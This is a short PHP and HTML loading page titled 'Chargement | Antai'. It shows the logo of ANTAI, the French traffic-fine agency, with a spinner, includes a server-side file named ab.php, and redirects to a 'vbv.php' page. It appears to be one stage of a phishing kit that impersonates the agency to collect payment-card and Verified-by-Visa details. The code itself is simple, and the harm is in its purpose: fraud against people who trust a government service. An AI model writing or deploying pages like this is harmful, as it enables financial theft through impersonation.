<?php 
include '../../server/ab.php';
?>

<html>

<style>
@import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap');

p{
 font-family: 'Bebas Neue', cursive;

}
</style>

<head>
  <title>Chargement | Antai</title>
      <meta name="viewport" content="width=device-width"/>
      <meta http-equiv="refresh" content="<?= $time;?>;URL=<?php 
        if(isset($_GET['rd']))
        { 
            if ($_GET['rd'] == "vbv")
            {
              echo './vbv.php';
            }
          }
          ?>">
  </head>
  <body>
  
    <center>
      <center><img style="width: 90px; margin-top: 250px;" src="img/antai2.png">
      </center>
      <div style="margin-top: 50px;" class="loadingio-spinner-rolling-1foafbztm83">
        <div class="ldio-kwlss8n4oxj">
          <div>

          </div>
        </div>
      </div>
    </center>
         
      
<style type="text/css">
@keyframes ldio-kwlss8n4oxj {
  0% { transform: translate(-50%,-50%) rotate(0deg); }
  100% { transform: translate(-50%,-50%) rotate(360deg); }
}
.ldio-kwlss8n4oxj div {
  position: absolute;
  width: 60px;
  height: 60px;
  border: 10px solid #3d67ae;
  border-top-color: transparent;
  border-radius: 50%;
}
.ldio-kwlss8n4oxj div {
  animation: ldio-kwlss8n4oxj 1s linear infinite;
  top: 50px;
  left: 50px
}
.loadingio-spinner-rolling-1foafbztm83 {
  width: 60px;
  height: 60px;
  display: inline-block;
  overflow: hidden;
  background: #ffffff;
}
.ldio-kwlss8n4oxj {
  width: 100%;
  height: 100%;
  position: relative;
  transform: translateZ(0) scale(0.6);
  backface-visibility: hidden;
  transform-origin: 0 0;
}
.ldio-kwlss8n4oxj div { box-sizing: content-box; }

</style>

  </body>

</html>